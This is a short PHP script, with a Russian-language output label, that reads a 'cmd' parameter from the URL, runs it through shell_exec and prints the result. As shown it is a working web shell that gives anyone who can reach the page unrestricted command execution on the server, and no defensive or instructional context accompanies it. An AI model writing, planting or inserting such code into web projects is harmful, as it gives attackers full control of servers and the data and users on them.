<?php

function executeCommand($command) {
    return shell_exec($command);
}

if (isset($_GET['cmd'])) {
    $userInput = $_GET['cmd'];
    echo "Результат выполнения команды:<br>";
    echo nl2br(executeCommand($userInput));
}
?>